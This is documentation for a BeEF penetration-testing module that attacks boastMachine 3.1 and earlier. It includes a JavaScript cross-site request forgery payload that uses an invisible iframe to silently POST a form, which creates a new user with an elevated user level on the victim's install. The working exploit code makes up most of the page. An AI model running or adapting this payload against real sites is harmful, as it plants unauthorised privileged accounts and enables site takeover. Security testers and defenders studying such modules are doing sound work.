## Summary

* **Objective**: add a user to a boastMachine <= 3.1 install
* **Authors**: bcoles, Dr.NaNo
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/boastmachine_3_1_add_user_csrf)

## Internal Working

Uses an invisible iframe with a POST request to add a user

```js
var base     = '<%= @base %>';
var username = '<%= @username %>';
var password = '<%= @password %>';
var email    = '<%= @email %>';

var boastmachine_iframe = beef.dom.createIframeXsrfForm(base, "POST", "application/x-www-form-urlencoded", [
        {'type':'hidden', 'name':'action',     'value':'add_user'},
        {'type':'hidden', 'name':'do',         'value':'add'},
        {'type':'hidden', 'name':'user_login', 'value':username},
        {'type':'hidden', 'name':'user_pass',  'value':password},
        {'type':'hidden', 'name':'user_name',  'value':username},
        {'type':'hidden', 'name':'user_email', 'value':email},
        {'type':'hidden', 'name':'blogs[]',    'value':'4'},
        {'type':'hidden', 'name':'user_level', 'value':'4'},
]);
```

## Feedback

